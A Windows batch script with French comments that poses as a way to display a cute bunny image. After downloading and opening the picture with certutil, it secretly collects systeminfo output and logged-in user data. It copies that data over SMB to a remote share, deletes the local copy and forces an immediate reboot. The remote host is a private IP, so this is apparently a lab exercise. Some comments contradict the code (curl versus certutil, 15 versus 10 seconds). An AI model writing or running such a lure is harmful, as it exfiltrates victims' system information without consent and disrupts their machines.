@echo off
setlocal

:: URL de l'image que vous souhaitez afficher
set "image_url=https://img.freepik.com/free-photo/cute-ai-generated-cartoon-bunny_23-2150288881.jpg"

:: Téléchargez l'image depuis l'URL (vous devez avoir curl installé)
certutil -urlcache -split -f "%image_url%" C:\Users\Administrateur\Pictures\image.jpg

:: Affichez l'image à l'aide de la visionneuse d'images par défaut (vous devez avoir une visionneuse d'images associée aux fichiers .jpg)
explorer.exe /e,C:\Users\Administrateur\Pictures\image.jpg

:: Spécifiez le nom du fichier source local
set "fichier_source=informations_systeme.txt"

:: Générez les informations système et enregistrez-les dans le fichier source
systeminfo > "%fichier_source%"

:: Obtenez le nombre d'utilisateurs actuellement connectés
query user >> "%fichier_source%"

:: Spécifiez le nom ou l'adresse IP du serveur distant
set "serveur_destination=192.168.159.154"

:: Spécifiez le chemin de destination sur le serveur distant
set "chemin_destination=\\192.168.159.154\test\"

:: Utilisez xcopy pour copier le fichier vers le serveur distant via SMB
xcopy /Y "%fichier_source%" "%chemin_destination%"

:: Supprimez le fichier source local si nécessaire
del "%fichier_source%"

:: Attendez 15 secondes avant de redémarrer
timeout /t 10

:: Redémarrez le système
shutdown /r /t 0

endlocal
